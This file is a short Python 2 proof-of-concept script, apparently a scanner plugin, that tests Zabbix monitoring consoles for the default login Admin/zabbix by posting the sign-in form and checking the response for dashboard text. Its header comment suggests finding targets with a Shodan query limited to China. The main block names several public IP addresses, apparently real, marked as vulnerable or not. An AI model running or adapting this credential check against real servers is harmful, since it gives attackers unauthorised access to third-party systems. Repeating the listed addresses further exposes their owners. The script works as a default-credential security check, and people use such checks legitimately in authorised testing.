# coding:utf-8

import requests

"""
zabbix 默认口令检测
支持两种zabbix版本
Admin/zabbix

目标发现：shodan
Set-Cookie: zbx_sessionid country:cn

cdxy 16.04.20
"""


def info():
    pass


def exp():
    pass


def poc(url):
    d = {
        'request': '',
        'name': 'Admin',
        'password': 'zabbix',
        'autologin': '0',
        'enter': 'Sign in'
    }
    h1 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
    }
    h2 = {
        'Referer': url,
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
        'Connection': 'close'
    }
    # http://stackoverflow.com/questions/10115126/python-requests-close-http-connection
    s = requests.session()

    # s.config['keep_alive'] = False
    try:
        if s.get(url, timeout=5, headers=h1):
            r = requests.post(url + '/index.php', data=d, headers=h2, timeout=10)
            if 'monitor' in r.content or 'Dashboard' in r.content:
                return True
        else:
            return False
    except Exception, e:
        print e

    return False


if __name__ == '__main__':
    url1 = 'http://54.222.167.52/'  # True
    url2 = 'http://180.235.64.209:8080/'  # True
    unsuccess_url = 'http://101.198.161.9'  # False
    print poc('http://116.228.211.171:8443/')
